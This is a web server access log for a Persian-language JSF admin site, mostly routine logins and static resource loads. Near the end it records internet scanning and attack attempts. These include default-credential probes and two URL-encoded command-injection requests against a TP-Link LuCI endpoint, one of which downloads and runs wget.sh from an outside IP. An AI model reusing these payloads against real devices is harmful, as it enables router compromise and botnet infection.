44.220.188.134 - - [15/Jul/2024:00:42:01 +0330] "GET / HTTP/1.1" 200 6040
193.151.148.147 - - [15/Jul/2024:19:36:24 +0330] "GET /javax.faces.resource/css/theme/teanow-prime-1/theme.css.xhtml;jsessionid=B36F6A326F1C83F47CF4DD5003804E15 HTTP/1.1" 200 53430
193.151.148.147 - - [15/Jul/2024:19:36:24 +0330] "GET /javax.faces.resource/css/animate.css.xhtml;jsessionid=B36F6A326F1C83F47CF4DD5003804E15 HTTP/1.1" 200 78897
193.151.148.147 - - [15/Jul/2024:19:36:24 +0330] "GET /javax.faces.resource/css/login.css.xhtml;jsessionid=B36F6A326F1C83F47CF4DD5003804E15 HTTP/1.1" 200 9656
193.151.148.147 - - [15/Jul/2024:19:36:24 +0330] "GET /javax.faces.resource/css/select2.css.xhtml;jsessionid=B36F6A326F1C83F47CF4DD5003804E15 HTTP/1.1" 200 18114
193.151.148.147 - - [15/Jul/2024:19:36:24 +0330] "GET /javax.faces.resource/css/hamburgers.css.xhtml;jsessionid=B36F6A326F1C83F47CF4DD5003804E15 HTTP/1.1" 200 24721
193.151.148.147 - - [15/Jul/2024:19:36:24 +0330] "GET /javax.faces.resource/components.css.xhtml;jsessionid=B36F6A326F1C83F47CF4DD5003804E15?ln=primefaces&v=8.0 HTTP/1.1" 200 96157
193.151.148.147 - - [15/Jul/2024:19:36:24 +0330] "GET /javax.faces.resource/jquery/jquery.js.xhtml;jsessionid=B36F6A326F1C83F47CF4DD5003804E15?ln=primefaces&v=8.0 HTTP/1.1" 200 88237
193.151.148.147 - - [15/Jul/2024:19:36:24 +0330] "GET /javax.faces.resource/core.js.xhtml;jsessionid=B36F6A326F1C83F47CF4DD5003804E15?ln=primefaces&v=8.0 HTTP/1.1" 200 43146
193.151.148.147 - - [15/Jul/2024:19:36:24 +0330] "GET /javax.faces.resource/jquery/jquery-plugins.js.xhtml;jsessionid=B36F6A326F1C83F47CF4DD5003804E15?ln=primefaces&v=8.0 HTTP/1.1" 200 267621
193.151.148.147 - - [15/Jul/2024:19:36:24 +0330] "GET /javax.faces.resource/js/tilt.jquery.min.js.xhtml;jsessionid=B36F6A326F1C83F47CF4DD5003804E15 HTTP/1.1" 200 5640
193.151.148.147 - - [15/Jul/2024:19:36:24 +0330] "GET /javax.faces.resource/js/select2.js.xhtml;jsessionid=B36F6A326F1C83F47CF4DD5003804E15 HTTP/1.1" 200 169126
193.151.148.147 - - [15/Jul/2024:19:36:24 +0330] "GET /javax.faces.resource/components.js.xhtml;jsessionid=B36F6A326F1C83F47CF4DD5003804E15?ln=primefaces&v=8.0 HTTP/1.1" 200 435082
193.151.148.147 - - [15/Jul/2024:19:36:24 +0330] "GET /javax.faces.resource/js/login.js.xhtml;jsessionid=B36F6A326F1C83F47CF4DD5003804E15 HTTP/1.1" 200 40319
193.151.148.147 - - [15/Jul/2024:19:36:24 +0330] "GET /javax.faces.resource/unload.js.xhtml;jsessionid=B36F6A326F1C83F47CF4DD5003804E15?ln=omnifaces&v=3.2 HTTP/1.1" 200 2565
193.151.148.147 - - [15/Jul/2024:19:36:24 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebregularfanum.woff.xhtml?ln=fonts HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:24 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebboldfanum.woff.xhtml?ln=fonts HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:34 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebmediumfanum.woff.xhtml?ln=fonts HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:34 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanweblightfanum.woff.xhtml?ln=fonts HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:34 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebthinfanum.woff.xhtml?ln=fonts HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:34 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebextraboldfanum.woff.xhtml?ln=fonts HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:34 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebblackfanum.woff.xhtml?ln=fonts HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:34 +0330] "POST /;jsessionid=B36F6A326F1C83F47CF4DD5003804E15 HTTP/1.1" 200 127
193.151.148.147 - - [15/Jul/2024:19:36:34 +0330] "GET /admin/ HTTP/1.1" 200 28268
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/primeicons/primeicons.css.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/css/theme/teanow-prime-1/theme.css.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/extra-libs/c3/c3.min.css.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/theme.css.xhtml?ln=primefaces-aristo HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/css/admin.css.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/css/panel-rtl.css.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/jquery/jquery.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/jquery/jquery-plugins.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/components.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/core.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/js/sidebarmenu.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/js/ktskey.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/libs/perfect-scrollbar/dist/perfect-scrollbar.jquery.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/js/feather.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/libs/bootstrap/dist/js/bootstrap.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/extra-libs/c3/d3.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/js/custom.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/js/pages/dashboards/dashboard1.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/js/datepicker-fa.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/extra-libs/c3/c3.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/themify-icons/themify-icons.css.xhtml?ln=icons HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/simple-line-icons/css/simple-line-icons.css.xhtml?ln=icons HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebregularfanum.woff.xhtml?ln=fonts HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:35 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebmediumfanum.woff.xhtml?ln=fonts HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:41 +0330] "GET /admin/?page=21 HTTP/1.1" 200 94406
193.151.148.147 - - [15/Jul/2024:19:36:41 +0330] "GET /javax.faces.resource/touch/touchswipe.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:41 +0330] "GET /javax.faces.resource/fileupload/fileupload.css.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:41 +0330] "GET /javax.faces.resource/css/admin.css.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:41 +0330] "GET /javax.faces.resource/extra-libs/c3/c3.min.css.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:41 +0330] "GET /javax.faces.resource/theme.css.xhtml?ln=primefaces-aristo HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:41 +0330] "GET /javax.faces.resource/css/theme/teanow-prime-1/theme.css.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:41 +0330] "GET /javax.faces.resource/jquery/jquery.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/css/panel-rtl.css.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/jquery/jquery-plugins.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/primeicons/primeicons.css.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/core.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/js/ktskey.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/components.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/simple-line-icons/css/simple-line-icons.css.xhtml?ln=icons HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/themify-icons/themify-icons.css.xhtml?ln=icons HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/js/feather.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/libs/bootstrap/dist/js/bootstrap.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/js/sidebarmenu.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/libs/perfect-scrollbar/dist/perfect-scrollbar.jquery.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/js/pages/dashboards/dashboard1.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/extra-libs/c3/d3.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/js/custom.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/js/datepicker-fa.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/extra-libs/c3/c3.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebregularfanum.woff.xhtml?ln=fonts HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebmediumfanum.woff.xhtml?ln=fonts HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:42 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebboldfanum.woff.xhtml?ln=fonts HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /admin/?page=22&item=666c438c1ad35d4488450763 HTTP/1.1" 200 260994
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/css/theme/teanow-prime-1/theme.css.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/theme.css.xhtml?ln=primefaces-aristo HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/css/panel-rtl.css.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/css/admin.css.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/extra-libs/c3/c3.min.css.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/jquery/jquery.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/primeicons/primeicons.css.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/jquery/jquery-plugins.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/core.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/components.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/touch/touchswipe.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/fileupload/fileupload.css.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/js/custom.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/js/ktskey.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/libs/bootstrap/dist/js/bootstrap.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/js/sidebarmenu.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/js/feather.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/libs/perfect-scrollbar/dist/perfect-scrollbar.jquery.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/extra-libs/c3/d3.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/js/pages/dashboards/dashboard1.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/extra-libs/c3/c3.min.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/simple-line-icons/css/simple-line-icons.css.xhtml?ln=icons HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/js/datepicker-fa.js.xhtml HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/themify-icons/themify-icons.css.xhtml?ln=icons HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebregularfanum.woff.xhtml?ln=fonts HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebmediumfanum.woff.xhtml?ln=fonts HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/font-awesome/webfonts/fa-solid-900.woff2.xhtml?ln=icons HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebboldfanum.woff.xhtml?ln=fonts HTTP/1.1" 304 -
193.151.148.147 - - [15/Jul/2024:19:36:54 +0330] "GET /javax.faces.resource/font-awesome/webfonts/fa-regular-400.woff2.xhtml?ln=icons HTTP/1.1" 304 -
94.156.10.163 - - [15/Jul/2024:19:59:57 +0330] "POST /goform/set_LimitClient_cfg HTTP/1.1" 404 797
71.6.232.23 - - [15/Jul/2024:20:37:55 +0330] "GET / HTTP/1.1" 200 6039
45.58.184.196 - - [15/Jul/2024:20:54:18 +0330] "-" 400 2853
45.58.184.196 - - [15/Jul/2024:20:54:18 +0330] "-" 400 2881
45.58.184.196 - - [15/Jul/2024:20:54:19 +0330] "GET / HTTP/1.1" 200 6040
45.58.184.196 - - [15/Jul/2024:20:54:19 +0330] "GET /download/powershell/ HTTP/1.1" 404 795
94.156.10.163 - - [15/Jul/2024:21:10:34 +0330] "POST /goform/set_LimitClient_cfg HTTP/1.1" 404 797
117.208.141.180 - - [15/Jul/2024:21:20:16 +0330] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 798
167.94.138.48 - - [15/Jul/2024:21:36:03 +0330] "GET / HTTP/1.1" 200 6041
167.94.138.48 - - [15/Jul/2024:21:36:10 +0330] "GET / HTTP/1.1" 200 6039
167.94.138.48 - - [15/Jul/2024:21:36:14 +0330] "GET /favicon.ico HTTP/1.1" 404 778
94.156.10.163 - - [15/Jul/2024:21:58:52 +0330] "POST /goform/set_LimitClient_cfg HTTP/1.1" 404 797
210.217.116.7 - - [15/Jul/2024:22:23:13 +0330] "GET / HTTP/1.0" 200 6040
85.99.117.148 - - [15/Jul/2024:22:29:44 +0330] "GET / HTTP/1.0" 200 6039
64.62.197.80 - - [15/Jul/2024:22:34:51 +0330] "GET /gremlin HTTP/1.1" 404 774
45.148.10.202 - - [15/Jul/2024:23:23:12 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 805
45.148.10.202 - - [15/Jul/2024:23:23:12 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.1" 404 805
141.98.11.15 - - [15/Jul/2024:23:51:49 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
213.181.196.180 - - [15/Jul/2024:23:54:44 +0330] "GET / HTTP/1.0" 200 6041
